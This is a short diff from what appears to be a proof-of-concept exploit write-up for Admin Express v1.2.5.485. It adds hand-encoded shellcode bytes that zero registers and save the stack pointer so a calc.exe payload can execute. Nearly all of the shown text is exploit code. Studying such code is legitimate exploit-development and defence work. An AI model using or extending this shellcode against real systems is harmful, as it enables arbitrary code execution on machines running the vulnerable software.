@@ -580,6 +580,10 @@ Anyways, here is the updated PoC:
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
 
 
+# For zeroing out registers before manual shellcode
+zero = "\x25\x01\x01\x01\x01"           # and eax, 0x01010101
+zero += "\x25\x10\x10\x10\x10"          # and eax, 0x10101010
+
 # We need to save the current stack pointer before execution of shellcode, due to
 # old stack pointer value needed when executing our payload of calc.exe. This puts the current stack pointer 0x0012DC98 into ECX, to be used later
 restore = "\x54"                        # push esp; (pushing the current value of ESP, which needs to be restored later, onto the stack)
